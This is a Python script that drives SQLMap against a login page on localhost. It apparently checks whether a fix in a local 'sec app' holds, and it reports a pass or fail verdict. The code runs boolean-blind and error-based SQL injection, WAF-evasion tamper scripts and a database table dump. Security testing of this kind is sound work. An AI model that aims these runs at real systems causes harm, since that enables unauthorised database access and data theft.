#!/usr/bin/env python3
"""
sqli_attack.py — SQLMap-based attack script against the sec app
Launches SQLMap with progressively aggressive flags and captures results.
Usage:
    python sqli_attack.py
    python sqli_attack.py --level 3 --risk 2
"""

import subprocess
import argparse
import json
import os
import sys
from datetime import datetime, timezone
from pathlib import Path

TARGET_URL       = "http://127.0.0.1:6001/login"   # vulnerable app port
PARAMETER        = "username"
TIMESTAMP        = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
OUTPUT_DIR       = Path(f"sqlmap_output_{TIMESTAMP}")

# SQLite-specific: only Boolean-blind and Error-based work
# Time-based (T), UNION (U), Stacked (S) do NOT work in SQLite
SQLITE_TECHNIQUES = "BE"

# Response anchors — teach SQLMap what success vs failure looks like
SUCCESS_STRING    = "Welcome"      # appears on successful login
FAILURE_STRING    = "Login failed" # appears on failed login


def check_sqlmap():
    try:
        result = subprocess.run(
            ["sqlmap", "--version"],
            capture_output=True, text=True, timeout=10
        )
        print(f"[+] SQLMap found: {result.stdout.strip()}")
        return True
    except FileNotFoundError:
        print("[ERROR] sqlmap not found. Install with: pip install sqlmap")
        return False


def run_sqlmap(level: int, risk: int, technique: str, extra_flags: list = None) -> dict:
    """
    Run SQLMap with given flags and return structured result.
    SQLite supports: B=Boolean-blind, E=Error-based ONLY
    Does NOT support: T=Time-based, U=UNION (limited), S=Stacked queries
    """
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    cmd = [
        "sqlmap",
        # Full URL with GET parameters so SQLMap knows exactly what to fuzz
        "-u", f"{TARGET_URL}?username=test&password=test",
        "-p", PARAMETER,                  # target this parameter specifically
        "--dbms=sqlite",
        "--level", str(level),
        "--risk",  str(risk),
        "--technique", technique,
        "--batch",                        # non-interactive, auto-yes
        "--output-dir", str(OUTPUT_DIR),
        # NO --forms flag: app uses GET params directly, not a parsed form
        "--threads", "3",
        "--timeout", "15",
        "--retries", "3",
        # Teach SQLMap what success vs failure looks like
        "--string", SUCCESS_STRING,       # this text = injection succeeded
        # Response comparison anchors help boolean-blind work reliably
        "--smart",                        # heuristic pre-check before full scan
    ]

    if extra_flags:
        cmd.extend(extra_flags)

    print(f"\n[*] Running: {' '.join(cmd)}\n")

    result = {
        "technique": technique,
        "level": level,
        "risk": risk,
        "command": " ".join(cmd),
        "vulnerable": False,
        "output": "",
        "error": ""
    }

    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=120
        )
        result["output"] = proc.stdout + proc.stderr

        # Parse sqlmap output for key findings
        out_lower = result["output"].lower()
        if "is vulnerable" in out_lower or "parameter" in out_lower and "injectable" in out_lower:
            result["vulnerable"] = True
        if "not injectable" in out_lower or "does not seem to be injectable" in out_lower:
            result["vulnerable"] = False

    except subprocess.TimeoutExpired:
        result["error"] = "TIMEOUT — SQLMap took longer than 120s"
    except Exception as e:
        result["error"] = str(e)

    return result


def run_attack_suite(level: int, risk: int) -> list:
    print("\n" + "="*55)
    print("  SQLMap Attack Suite — Sec App Remediation Test")
    print("="*55)
    print(f"  Target    : {TARGET_URL}")
    print(f"  Parameter : {PARAMETER}")
    print(f"  Level     : {level}  |  Risk: {risk}")
    print(f"  Timestamp : {TIMESTAMP}")
    print("="*55)

    attack_runs = [
        # SQLite ONLY supports Boolean-blind and limited Error-based
        # Time-based (SLEEP), UNION multi-row, Stacked queries — all unsupported in SQLite

        # (description, technique, extra_flags)
        ("Boolean-blind (core)",           "B",  []),
        ("Boolean-blind high level",       "B",  ["--level", "4", "--risk", "2"]),
        ("Error-based",                    "E",  []),
        ("Boolean + Error combined",       "BE", []),
        ("WAF evasion — randomcase",       "B",  ["--tamper", "randomcase"]),
        ("WAF evasion — space2comment",    "B",  ["--tamper", "space2comment"]),
        ("WAF evasion — charurlencoded",   "B",  ["--tamper", "charurlencoded"]),
        # Dump attempt — only run if injection confirmed
        ("Dump tables (boolean)",          "B",  ["--dump", "--tables", "--level", "3"]),
    ]

    results = []
    for desc, technique, extra in attack_runs:
        print(f"\n[ATTACK] {desc} (technique={technique})")
        r = run_sqlmap(level, risk, technique, extra)
        r["description"] = desc

        status = "VULNERABLE ⚠️ " if r["vulnerable"] else "NOT INJECTABLE ✅"
        print(f"  Result : {status}")
        if r["error"]:
            print(f"  Error  : {r['error']}")

        results.append(r)

    return results


def save_report(results: list):
    report = {
        "timestamp": TIMESTAMP,
        "target": TARGET_URL,
        "parameter": PARAMETER,
        "total_runs": len(results),
        "vulnerable_count": sum(1 for r in results if r["vulnerable"]),
        "results": results
    }

    report_path = OUTPUT_DIR / f"attack_report_{TIMESTAMP}.json"
    report_path.write_text(json.dumps(report, indent=2))

    print(f"\n[+] Report saved: {report_path}")
    print(f"[+] Vulnerable in {report['vulnerable_count']}/{report['total_runs']} runs")

    verdict = "FAILED — Vulnerabilities found" if report["vulnerable_count"] > 0 else "PASSED — No injection found"
    print(f"\n{'='*55}")
    print(f"  VERDICT: {verdict}")
    print(f"{'='*55}\n")


def main():
    parser = argparse.ArgumentParser(description="SQLMap Attack Script for Sec App")
    parser.add_argument("--level", type=int, default=2, help="SQLMap level 1-5 (default: 2)")
    parser.add_argument("--risk",  type=int, default=1, help="SQLMap risk 1-3 (default: 1)")
    args = parser.parse_args()

    if not check_sqlmap():
        sys.exit(1)

    results = run_attack_suite(args.level, args.risk)
    save_report(results)


if __name__ == "__main__":
    main()
